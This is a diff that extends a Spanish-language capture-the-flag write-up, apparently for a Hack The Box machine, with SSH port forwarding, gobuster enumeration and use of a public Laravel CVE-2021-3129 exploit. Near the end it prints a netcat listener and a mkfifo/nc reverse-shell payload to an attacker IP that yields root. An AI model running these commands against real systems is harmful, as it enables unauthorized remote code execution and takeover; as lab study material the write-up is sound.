@@ -197,4 +197,38 @@ Hacemos un netstat para ver los servicios que corren en los puertos
 netstat -pentul
 ```
 Si vamos haciendo curls a los diferentes puertos encontraremos diferente información interesante.
-Ahora si que vamos a utilizar bien el ssh, creamos desde nuestro ordenador principal unas keys como anteirormente y las llevamos a "autorized_ke
+Ahora si que vamos a utilizar bien el ssh, creamos desde nuestro ordenador principal unas keys como anteirormente y las llevamos a "autorized_keys" y la exportamos a la máquina victima y para acabar nos conectamos
+```
+ssh -i id_rsa -L 8000:localhost:8000 strapi@10.10.11.105
+```
+Ahora si en nuestro navegador nos dirigimos a nuestra ip localhosts y al puerto encontraremos dicha página que nos hemos conectado "127.0.0.1:8000"
+
+Hacemos un gobuster
+```
+gobuster dir -u http://localhost:8000 -w /usr/share/seclists/Discovery/WebContent/raft-small-words.txt
+```
+Encontramos una redirección a "/profiles"
+
+Laravel tiene un problema de framework y encontramos e identificamos una vulnerabilidad
+```
+git clone https://github.com/nth347/CVE-2021-3129_exploit.git
+cd CVE-2021-3129_exploit
+chmod +x exploit.py
+```
+Cuando esta todo probamos a hacer un "id"
+```
+./exploit.py http://localhost:8000 Monolog/RCE1 id
+```
+Si todo funciona correctamente ya podemos hacer la reverse shell.
+
+Abirmos una escucha
+```
+nc -lvnp 9001
+```
+Y utilizamos el exploit.
+```
+./exploit.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat
+/tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9001 >/tmp/f'
+```
+Ya dentro con Root
+GG
